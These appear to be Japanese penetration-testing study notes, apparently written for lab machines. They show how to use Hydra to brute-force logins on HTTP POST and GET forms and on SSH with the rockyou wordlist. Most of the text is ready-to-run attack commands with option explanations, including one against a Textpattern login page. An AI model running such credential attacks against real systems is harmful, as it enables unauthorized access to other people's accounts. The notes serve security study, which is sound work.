```
#POST ":"以降は各アプリケーションの認証時のペイロードによって変わる。コマンドをミスると時間を浪費して悲惨なことになる。
hydra -l <USER> -P <PASSWORDS_LIST> <IP> http-post-form "/webapp/login.php:username=^USER^&password=^PASS^:Invalid" -t <THREADS_NUMBER>

#GET 同上
hydra <IP> -V -l <USER> -P <PASSWORDS_LIST> http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t <THREADS_NUMBER>
```
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt [RHOST] http-post-form "[url]:[post]:[error]" -V
```
hydraのオプションを解説

>-l ：ユーザーネームです。-Lでファイルを指定することで複数のユーザーネームを指定することも可能です。  
>-P：パスワードに使用するワードリストです。-pにすることで特定のパスワードを指定することも可能です。  
>[RHOST]：ターゲットのipアドレスもしくはホスト名です。  
>http-post-form or http-form-post：ターゲットのプロトコルを指定します。他にftpやsshなどがあります。  
>"[url]:[post]:[error]"：   
認証ページへのパス、送信するデータ、ログインに失敗したことを判定できる文字列を順番に指定します。 ユーザーネームとパスワードが入る場所は\^USER\^と\^PASS\^に置き換えます。  
burp suiteなどを用いて実行するコマンドを作成します。(動画内のコマンドはエラー文が間違っています。下記コマンドが正しいコマンドです。)
```
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt machine4 http-post-form "/app/textpattern/textpattern/index.php:lang=en&p_userid=^USER^&p_password=^PASS^&_txp_token=:Could not log in" -V
```
hydraでsshをクラック  
```
hydra -l sean -t 4 -f -V -P /usr/share/wordlists/rockyou.txt 10.11.1.251 ssh    
```
>-f：ログインとパスのペアが見つかったら終了する
>-V：試行ごとにログインとパスを表示
>